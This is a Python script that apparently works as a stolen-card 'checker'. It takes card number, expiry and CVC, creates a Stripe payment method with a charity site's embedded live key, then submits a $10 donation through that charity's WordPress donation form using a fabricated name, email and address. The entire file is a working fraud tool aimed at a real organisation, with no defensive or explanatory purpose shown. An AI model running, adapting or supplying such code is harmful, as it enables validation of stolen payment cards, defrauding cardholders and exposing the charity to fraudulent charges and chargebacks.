import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
			'authority': 'api.stripe.com',
			'accept': 'application/json',
			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
			'content-type': 'application/x-www-form-urlencoded',
			'origin': 'https://js.stripe.com',
			'referer': 'https://js.stripe.com/',
			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-site',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}

	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=f7c8672e-8939-465a-a7b9-3db78c5ebceebd8678&muid=4cc64187-ec65-44d9-8ace-57208010cee852d548&sid=7783f10a-495b-4507-881b-72c170d3d5ba3ebd17&payment_user_agent=stripe.js%2F019cc90856%3B+stripe-js-v3%2F019cc90856%3B+card-element&referrer=https%3A%2F%2Fwww.destinyafrica.org&time_on_page=51121&key=pk_live_42Mna3W0HTHymKg30YvT5j232p6Tl63Q3q7zYcfmSpzCrd4sfNXAdYQnIb3tOtTC3KftOor7sA26p6WYDoy0KLBdW00Vplz7Qu7'
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

	pm = r1.json()['id']

	cookies = {
			'__stripe_mid': '4cc64187-ec65-44d9-8ace-57208010cee852d548',
			'__stripe_sid': '7783f10a-495b-4507-881b-72c170d3d5ba3ebd17',
	}

	headers = {
			'authority': 'www.destinyafrica.org',
			'accept': '*/*',
			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			# 'cookie': '__stripe_mid=cd04496a-fc78-49f6-99fc-6310e3e55e6221dc47; __stripe_sid=b3b7888f-21a6-4ff7-a3cf-b0242d6fcf37cce97e',
			'origin': 'https://www.destinyafrica.org',
			'referer': 'https://www.destinyafrica.org/divine-miracle/',
			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
			'x-requested-with': 'XMLHttpRequest',
	}

	params = {
			't': '1725539877765',
	}

	data = {
			'data': '__fluent_form_embded_post_id=4741&_fluentform_6_fluentformnonce=3627c9222e&_wp_http_referer=%2Fdivine-miracle%2F&custom-payment-amount=10&input_text_3=NK&input_text_4=North%20Jain&email=zone215%40outlook.com&address_1%5Baddress_line_1%5D=432%20Schaefer%20Unions&address_1%5Bcity%5D=South%20Kathryn&address_1%5Bstate%5D=NY&address_1%5Bzip%5D=49202&address_1%5Bcountry%5D=US&payment_method=stripe&item__6__fluent_checkme_=&__stripe_payment_method_id='+str(pm)+'',
			'action': 'fluentform_submit',
			'form_id': '6',
	}
	
	r2 = requests.post(
			'https://www.destinyafrica.org/wp-admin/admin-ajax.php',
			params=params,
			cookies=cookies,
			headers=headers,
			data=data,
	)
	return (r2.json())